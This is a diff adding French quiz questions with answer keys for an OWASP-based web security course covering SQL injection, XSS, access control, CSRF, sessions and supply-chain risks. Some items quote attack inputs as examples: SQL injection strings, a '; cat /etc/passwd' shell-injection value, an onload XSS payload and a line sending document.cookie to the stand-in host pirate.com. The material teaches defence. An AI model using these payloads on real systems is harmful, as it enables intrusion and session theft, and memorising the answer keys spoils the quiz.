@@ -257,3 +257,254 @@ $CATEGORY: Sécurité/OWASP
 ~Confier la sécurité uniquement à l'équipe production
 ~Faire les audits de sécurité après la mise en production
 }
+
+// --- TP 1 : les injections SQL ---
+
+::SECU-Q41 Le faux ami::Un développeur pense avoir corrigé une injection SQL avec ce code \:
+$request \= "SELECT * FROM users WHERE id \= $id"\;
+$pdo->prepare($request)->execute()\;
+Pourquoi la faille est-elle toujours présente ?{
+=La donnée est collée dans la chaîne avant le prepare(), elle fait déjà partie du texte SQL#Exact, préparer une requête déjà concaténée ne protège de rien \: le ? doit remplacer la donnée, qui n'arrive qu'avec execute([...]).
+~Parce que prepare() ne protège que les requêtes INSERT
+~Parce qu'il faudrait utiliser query() à la place de prepare()#Non, query() n'apporte aucune protection.
+~Parce que la variable $id n'est pas entourée d'apostrophes#Ajouter des apostrophes ne protège pas \: l'attaquant peut les fermer lui-même.
+}
+
+::SECU-Q42 Une recherche avec LIKE::Pour une recherche sécurisée, on écrit la requête SELECT * FROM articles WHERE title LIKE ? et on place les caractères % {=dans la donnée passée à execute() ~autour du ? dans la requête, entre apostrophes ~dans le nom de la colonne ~dans un second appel à prepare()}.
+
+::SECU-Q43 Le placeholder entre guillemets::Que se passe-t-il à l'exécution de ce code d'inscription ?
+$request \= "INSERT INTO users (name, email) VALUES ('?', '?')"\;
+$pdo->prepare($request)->execute([$name, $email])\;{
+=PDO lève une exception (Invalid parameter number) et rien n'est inséré, c'est un bug et non une faille#Exact, un ? entre guillemets n'est pas un emplacement mais un simple caractère \: la requête n'attend aucun paramètre alors qu'execute() en reçoit deux.
+~L'utilisateur est inséré correctement et la requête est sécurisée
+~L'utilisateur est inséré avec le nom « ? » et l'email « ? »#Non, PDO compare le nombre de paramètres attendus et reçus avant d'exécuter.
+~La requête est vulnérable à l'injection SQL#Non, aucune donnée n'est concaténée \: le problème est un bug qui empêche toute inscription.
+}
+
+::SECU-Q44 Vrai ou Faux - Injection à l'aveugle::Une page qui répond seulement « Compte trouvé » ou « Compte inconnu », sans jamais afficher de données ni d'erreur SQL, est protégée contre l'injection SQL.{FALSE#Exact, c'est faux \: chaque réponse donne un oui ou un non, ce qui suffit à reconstituer une donnée caractère par caractère (avec substr). Cacher les messages ralentit l'attaque sans la corriger.#Relisez « L'injection à l'aveugle » du TP 1 \: seule la requête préparée protège.}
+
+::SECU-Q45 Les techniques d'injection::Associez chaque saisie injectée à la technique qu'elle illustre.{
+=admin' -- -> Contourner une connexion en mettant en commentaire la vérification du mot de passe
+=1 OR 1\=1 -> Rendre une condition toujours vraie pour récupérer toutes les lignes
+=' UNION SELECT login, password FROM users -- -> Recoller les colonnes d'une autre table dans le résultat affiché
+=1\; UPDATE users SET role\='admin' -> Enchaîner une seconde requête qui modifie la base
+= -> Exécuter du JavaScript dans le navigateur de la victime
+= -> Deviner un mot de passe en testant un dictionnaire
+}
+
+::SECU-Q46 L'injection shell::Le code system("ls " . $_GET['dossier'])\; permet d'exécuter n'importe quelle commande en envoyant dossier\=\; cat /etc/passwd. Quelle fonction PHP faut-il appliquer à la saisie pour qu'elle reste un simple argument de la commande ?{
+=escapeshellarg
+=escapeshellarg()
+}
+
+::SECU-Q47 L'inclusion de fichier::Une page contient include $_GET['page'] . '.php'\; pour afficher index.php?page\=accueil. Un attaquant affiche ainsi config.php. Comment corriger cette faille ?{
+=Vérifier la page demandée dans une liste blanche de pages autorisées (in_array) avant de l'inclure#Exact, l'utilisateur ne peut plus inclure que les pages que vous avez prévues.
+~Ajouter l'extension .php à la fin du chemin#C'est déjà le cas dans ce code, et cela n'empêche pas d'inclure config.php.
+~Utiliser require à la place de include#require ne change que le comportement en cas d'erreur, pas la sécurité.
+~Échapper la saisie avec htmlspecialchars#htmlspecialchars protège l'affichage HTML, pas un chemin de fichier.
+}
+
+// --- TP 2 : les failles XSS ---
+
+::SECU-Q48 L'attribut piégé::Une page construit une balise image dont l'attribut src reprend la saisie de l'utilisateur, sans filtre. Un visiteur saisit \:
+https\://exemple.com/chat.jpg" onload\="alert('Coucou')
+Pourquoi le JavaScript s'exécute-t-il ?{
+=Le guillemet ferme l'attribut src, puis la saisie ajoute un attribut onload qui contient du JavaScript#Exact, le navigateur reçoit un HTML parfaitement valide et exécute le onload.
+~Parce que l'image est hébergée sur un site en HTTPS
+~Parce qu'un navigateur exécute toujours l'attribut src d'une image comme du JavaScript
+~Parce que alert() est autorisé par défaut dans les formulaires
+}
+
+::SECU-Q49 Vrai ou Faux - XSS réfléchie::Une XSS réfléchie (le code voyage dans l'URL ou dans la saisie) touche automatiquement tous les visiteurs du site.{FALSE#Exact, c'est faux \: elle ne touche que la personne qui envoie le code, ou celle à qui on envoie le lien piégé. C'est la XSS stockée, enregistrée en base, qui touche tous les visiteurs.#Relisez le TP 2 \: la XSS réfléchie touche une victime à la fois, la XSS stockée touche tout le monde.}
+
+::SECU-Q50 La page de commentaires::Une page enregistre les commentaires avec INSERT INTO comments (content) VALUES (?) et execute([$content]), puis les affiche avec echo $comment['content'] dans un formulaire écrit <form> sans attribut. Quels sont les problèmes de ce code ? (plusieurs réponses attendues){
+~%50%Les commentaires sont réaffichés sans échappement \: c'est une XSS stockée#Exact, un seul commentaire piégé frappe tous les visiteurs.
+~%50%Le formulaire n'a ni method\="post" ni action, il envoie en GET et $_POST['content'] reste vide#Exact, un bug à corriger en même temps.
+~%-50%L'insertion est vulnérable à l'injection SQL#Non, elle utilise une requête préparée \: le problème est l'affichage.
+~%-50%Il faudrait remplacer la requête préparée par une concaténation pour pouvoir échapper#Surtout pas, la requête préparée est correcte.
+}
+
+::SECU-Q51 Les fonctions de protection::Associez chaque fonction PHP à son rôle.{
+=htmlspecialchars() -> Transformer les caractères spéciaux en entités HTML pour qu'ils s'affichent comme du texte
+=strip_tags() -> Supprimer purement et simplement les balises HTML
+=escapeshellarg() -> Transmettre une saisie comme un simple argument à une commande shell
+=hash_equals() -> Comparer deux secrets en temps constant
+= -> Chiffrer un mot de passe de façon réversible
+= -> Bloquer automatiquement les requêtes venant d'un autre site
+}
+
+::SECU-Q52 Le vol de session::Un attaquant réussit à injecter ce JavaScript dans une page \:
+new Image().src \= "http\://pirate.com/?c\=" + document.cookie\;
+Que fait ce code ?{
+=Il envoie discrètement le cookie de session de la victime vers le serveur de l'attaquant, qui peut se connecter à sa place#Exact, d'où l'intérêt de l'option HttpOnly sur le cookie de session \: document.cookie ne le voit plus.
+~Il affiche l'image du site pirate.com dans la page
+~Il supprime le cookie de session de la victime
+~Rien, un navigateur bloque toujours les images venant d'un autre domaine
+}
+
+::SECU-Q53 Vrai ou Faux - Filtre naïf::Un site qui retire toutes les balises <script> des saisies est protégé contre les XSS.{FALSE#Exact, c'est faux \: un attribut comme onerror ou onload sur une autre balise exécute aussi du JavaScript. La bonne protection reste d'échapper à l'affichage (htmlspecialchars).#Relisez l'épreuve « Contourner un filtre naïf » du TP 2 \: un onerror sur une autre balise suffit.}
+
+::SECU-Q54 Où protéger ?::Contre une XSS stockée, quelle solution le TP 2 recommande-t-il ?{
+=Stocker la saisie brute et l'échapper avec htmlspecialchars au moment de l'afficher#Exact, la donnée d'origine reste intacte et la protection est faite au bon endroit (l'affichage).
+~Supprimer les balises avec strip_tags avant l'enregistrement#C'est une solution possible, mais moins bonne \: elle altère la donnée d'origine.
+~Utiliser une requête préparée pour l'insertion#Elle protège de l'injection SQL, pas de la XSS.
+~Chiffrer les commentaires en base de données
+}
+
+// --- TP 3 : contrôle d'accès et journalisation ---
+
+::SECU-Q55 Lire les logs::Dans le journal d'accès, la même adresse IP demande /facture?id\=8986, puis 8987, 8988, 8989 et 8990 dans la même seconde. Que révèle cette suite ?{
+=Une énumération \: l'utilisateur teste les identifiants les uns après les autres pour trouver des factures qui ne sont pas les siennes#Exact, ce n'est pas un comportement humain normal.
+~Une attaque par déni de service (DDoS)#Cinq requêtes ne saturent pas un serveur.
+~Une injection SQL dans le paramètre id#Les valeurs envoyées sont des nombres valides, sans code SQL.
+~Un utilisateur qui recharge sa page de facture
+}
+
+::SECU-Q56 Le nom de la faille::Un utilisateur connecté lit la facture d'un autre client en changeant simplement le numéro dans l'URL. Quel acronyme (Insecure Direct Object Reference) désigne cette faille ?{
+=IDOR
+}
+
+::SECU-Q57 Le bon code HTTP::Après correction du contrôleur, quel code HTTP doit renvoyer une demande portant sur une facture qui existe mais qui appartient à un autre utilisateur ?{#403#Exact, 403 (interdit) \: 404 est réservé à une facture qui n'existe pas.}
+
+::SECU-Q58 Contrôler une facture::Dans FactureController, que doit vérifier le serveur avant d'afficher une facture demandée par son identifiant ? (plusieurs réponses attendues){
+~%50%Que la facture existe (sinon 404)#Exact.
+~%50%Que la facture appartient à l'utilisateur connecté (user_id comparé à Auth\:\:id(), sinon 403)#Exact, c'est la vérification de propriété oubliée dans le TP 3.
+~%-50%Que l'identifiant est difficile à deviner#Un identifiant se devine toujours \: ce n'est pas un contrôle d'accès.
+~%-50%Que la requête est préparée#Une requête préparée n'empêche pas d'accéder à la facture d'un autre.
+}
+
+::SECU-Q59 Le middleware::Dans Laravel, qu'est-ce qu'un middleware comme admin appliqué à un groupe de routes ?{
+=Un filtre exécuté avant le contrôleur, qui laisse passer la requête ou la bloque (redirection ou 403)#Exact, le test du rôle est écrit une seule fois pour tout le groupe.
+~Une table de la base de données qui stocke les administrateurs
+~Une vue Blade réservée aux administrateurs
+~Un fichier de logs qui enregistre les accès aux pages d'administration
+}
+
+::SECU-Q60 La route oubliée::Un développeur ajoute Route\:\:get('/admin/factures', 'FactureController@all') à la fin du fichier web.php, en dehors du groupe Route\:\:middleware(['admin']). Quelle est la conséquence ?{
+=La page qui liste les factures de tous les utilisateurs est accessible sans être administrateur#Exact, le middleware ne protège que les routes déclarées dans son groupe.
+~Laravel refuse de démarrer car la route est mal placée
+~La route hérite automatiquement du middleware des autres routes /admin
+~La route est protégée car son URL commence par /admin
+}
+
+::SECU-Q61 Analyser les logs::En production, le volume des journaux est énorme \: le repérage des accès anormaux doit être {=automatisé, avec une alerte ~manuel, en lisant les logs chaque matin ~désactivé pour ne pas ralentir le serveur ~confié aux utilisateurs du site}, c'est l'enjeu de la catégorie A09 de l'OWASP.
+
+// --- TP 4 : authentification, mots de passe et sessions ---
+
+::SECU-Q62 Vérifier un mot de passe::À l'inscription on stocke password_hash($password, PASSWORD_DEFAULT). À la connexion, on vérifie le mot de passe saisi avec la fonction {=password_verify ~password_compare ~password_decrypt ~md5}.
+
+::SECU-Q63 Ne pas filtrer le mot de passe::Pourquoi ne faut-il pas appliquer filter_input(..., FILTER_SANITIZE_SPECIAL_CHARS) sur un mot de passe avant de le hacher ?{
+=Le filtre altère des caractères légitimes (<, &, ")\: le mot de passe stocké n'est plus celui saisi et il est affaibli#Exact, on ne nettoie pas un mot de passe, on le hache tel quel.
+~Parce que filter_input n'existe plus depuis PHP 8
+~Parce que password_hash refuse les chaînes filtrées
+~Il faut au contraire toujours le filtrer avant de le hacher
+}
+
+::SECU-Q64 Reconnaître un hash::Après correction du TP 4, laquelle de ces valeurs peut-on trouver dans la colonne password de la table users ?{
+=$2y$10$Kq3eX2vB0cQh8mN1rT5uLe8yZ4pW6sA9dF7gH2jK3lM0nO1pQ2rS#Exact, le préfixe $2y$ indique bcrypt et 10 est le coût. Le sel est intégré au hash.
+~adminSuperMotDePasse#C'est le mot de passe en clair, la faille de départ du TP.
+~YWRtaW5TdXBlck1vdERlUGFzc2U\=#C'est du Base64 \: un simple encodage, trivialement réversible.
+~21232f297a57a5a743894a0e4a801fc3#C'est un hash MD5, beaucoup trop rapide à casser.
+}
+
+::SECU-Q65 Le bruteforce::Quel est l'objectif d'une limite de tentatives et d'un délai entre les essais sur un formulaire de connexion ?{
+=Rendre l'attaque par force brute trop lente pour être rentable#Exact, l'objectif n'est pas de la rendre impossible.
+~Rendre l'attaque totalement impossible#Aucune mesure ne la rend impossible, on la rend trop coûteuse.
+~Empêcher les injections SQL dans le formulaire
+~Chiffrer le mot de passe pendant son transport
+}
+
+::SECU-Q66 Limiter par IP::Le TP 4 compte les tentatives de connexion dans $_SESSION. Pourquoi faut-il, en production, limiter aussi par adresse IP ?{
+=Parce qu'un attaquant peut vider ses cookies et repartir avec une session neuve, donc un compteur remis à zéro#Exact, d'où un vrai mécanisme de rate limiting comme le RateLimiter de Laravel.
+~Parce que $_SESSION ne fonctionne pas sur un formulaire de connexion
+~Parce que l'adresse IP permet de retrouver le mot de passe
+~Ce n'est pas nécessaire, la session suffit
+}
+
+::SECU-Q67 Vrai ou Faux - Supprimer en GET::Une page admin.php?id\=1 qui supprime un utilisateur en GET est sûre, puisque seul un administrateur connecté peut l'utiliser.{FALSE#Exact, c'est faux \: une simple image piégée dans un email suffit à faire charger cette URL par le navigateur de l'admin connecté, qui joint tout seul son cookie de session. C'est une faille CSRF.#Relisez l'exercice 3 du TP 4 \: une action qui modifie des données ne se fait jamais en GET.}
+
+::SECU-Q68 Le POST ne suffit pas::Après le passage de la suppression en POST, pourquoi faut-il encore ajouter un jeton anti-CSRF ?{
+=Parce qu'un site piégé peut contenir un formulaire POST soumis automatiquement vers votre site, avec la session de la victime#Exact, le POST bloque l'image piégée, mais seul un jeton inconnu du site tiers bloque le formulaire forgé.
+~Parce que le POST est moins rapide que le GET
+~Parce que le jeton remplace le mot de passe de l'administrateur
+~Il ne faut pas, le POST suffit à bloquer toute attaque CSRF
+}
+
+::SECU-Q69 Comparer un jeton::Pourquoi le cours recommande-t-il hash_equals() plutôt que \=\=\= pour comparer le jeton CSRF reçu à celui de la session ?{
+=Pour éviter une attaque temporelle \: \=\=\= s'arrête au premier caractère différent, et le temps de réponse trahit le nombre de caractères corrects#Exact, hash_equals() compare toujours les chaînes en entier, en temps constant.
+~Parce que \=\=\= ne fonctionne pas sur les chaînes hexadécimales
+~Parce que hash_equals() déchiffre le jeton avant de le comparer
+~Parce que hash_equals() est plus rapide
+}
+
+::SECU-Q70 La fixation de session::Quelle fonction PHP, appelée juste après une connexion réussie, change l'identifiant de session et protège ainsi contre la fixation de session ?{
+=session_regenerate_id
+=session_regenerate_id()
+=session_regenerate_id(true)
+}
+
+::SECU-Q71 Le code TOTP::Le code de double authentification (TOTP) est recalculé par le téléphone et par le serveur à partir du même secret et de l'heure. Toutes les combien de secondes change-t-il ?{#30#Exact, et un bon code a une durée de vie courte et un usage unique.}
+
+::SECU-Q72 Mot de passe oublié::Un site vous renvoie par email votre mot de passe oublié, en clair. Qu'en déduisez-vous ?{
+=C'est très mauvais signe \: le site stocke le mot de passe en clair ou de façon réversible#Exact, un mot de passe haché ne peut pas être retrouvé. Le site devrait envoyer un lien unique et temporaire de réinitialisation.
+~C'est bon signe \: le site a bien sauvegardé votre mot de passe
+~C'est normal, le hachage permet de retrouver le mot de passe d'origine#Non, le hachage est à sens unique.
+~C'est sans risque tant que l'email est envoyé en HTTPS
+}
+
+// --- Le Top 10 2025 en pratique ---
+
+::SECU-Q73 Le Top 10 2025::Associez chaque code du Top 10 OWASP 2025 à sa catégorie.{
+=A01 -> Contrôles d'accès défaillants (dont IDOR, CSRF, SSRF)
+=A03 -> Défaillances de la chaîne d'approvisionnement logicielle
+=A05 -> Injection (SQL, OS, XSS…)
+=A09 -> Carence de journalisation et d'alerte
+= -> Mauvaise gestion des sauvegardes
+= -> Absence d'antivirus sur le serveur
+}
+
+::SECU-Q74 Fail open::Que reprocher à ce code ?
+try \{ $isAdmin \= checkAdmin($user)\; \} catch (Exception $e) \{ $isAdmin \= true\; \}{
+=En cas d'erreur, tout le monde devient administrateur \: c'est un comportement « fail open », il faut refuser l'accès par défaut#Exact, c'est la catégorie A10 \: en cas d'erreur, on journalise et on met $isAdmin à false (« fail closed »).
+~Il manque un finally pour fermer la connexion
+~Le bloc try est inutile, checkAdmin ne lève jamais d'exception
+~Rien, ce code est correct
+}
+
+::SECU-Q75 Un script depuis un CDN::Pour que le navigateur vérifie qu'un script chargé depuis un CDN n'a pas été modifié, on ajoute à la balise script l'attribut {=integrity ~async ~defer ~crossorigin} contenant l'empreinte du fichier (sha384-...).
+
+::SECU-Q76 Un panier dans un cookie::Une page exécute $panier \= unserialize($_COOKIE['panier'])\;. Quel est le problème et sa correction ?{
+=Le cookie est modifiable par le visiteur et unserialize peut créer des objets \: on utilise json_decode et on valide le contenu#Exact, c'est un manque d'intégrité des données (A08).
+~Le cookie est trop gros, il faut le compresser
+~unserialize est trop lent, il faut le mettre en cache
+~Il suffit d'encoder le cookie en Base64#Un encodage ne protège rien \: le visiteur peut le décoder et le modifier.
+}
+
+::SECU-Q77 Durcir la configuration::Quelles mesures corrigent une mauvaise configuration de sécurité (A02) ? (plusieurs réponses attendues){
+~%33.33333%Désactiver le listage des répertoires (Options -Indexes)#Exact.
+~%33.33333%Passer display_errors à Off et garder les erreurs dans les logs (log_errors \= On)#Exact.
+~%33.33334%Supprimer les exemples de code et les répertoires de debug#Exact.
+~%-50%Activer display_errors pour diagnostiquer plus vite les problèmes en production#Les erreurs détaillées révèlent des informations internes aux visiteurs.
+~%-50%Activer Options +Indexes pour faciliter l'accès aux fichiers#C'est justement la faille \: la liste des fichiers devient visible par tous.
+}
+
+::SECU-Q78 Installer les dépendances::Pour installer exactement les versions validées (fichiers lock versionnés) puis rechercher les vulnérabilités connues, quelles commandes utiliser ?{
+=composer install (ou npm ci) puis composer audit (ou npm audit)#Exact, les mêmes versions partout, et un contrôle des failles connues.
+~composer update (ou npm update) à chaque déploiement#Les dernières versions sont alors installées sans contrôle.
+~Supprimer le fichier composer.lock pour toujours avoir la dernière version
+~Indiquer "*" comme version de chaque dépendance dans composer.json#Toute version, même compromise, peut alors être installée.
+}
+
+::SECU-Q79 Conception non sécurisée::Une page de réinitialisation demande « Quelle est votre couleur préférée ? » avant de changer le mot de passe. Par quoi faut-il la remplacer ?{
+=Un lien unique et temporaire envoyé par email#Exact, une question secrète avec peu de réponses possibles se devine facilement \: c'est une conception non sécurisée (A06).
+~Une question plus difficile, comme la date de naissance#Une date se devine ou se trouve facilement, le problème reste le même.
+~Un captcha seul#Le captcha bloque les robots, il ne prouve pas l'identité.
+~Une réponse stockée en clair pour pouvoir la vérifier
+}
+
+::SECU-Q80 L'IA et les dépendances::Un assistant IA propose d'installer un paquet qui n'existe pas. Un attaquant publie ensuite un paquet malveillant portant ce nom inventé. Comment appelle-t-on cette attaque ?{
+=Le slopsquatting, une forme de Supply Chain Attack#Exact, d'où la règle \: vérifier chaque dépendance ajoutée par l'IA.
+~Le phishing
+~Le clickjacking#Le clickjacking piège un clic dans une page encadrée (protection \: X-Frame-Options).
+~L'injection SQL
+}
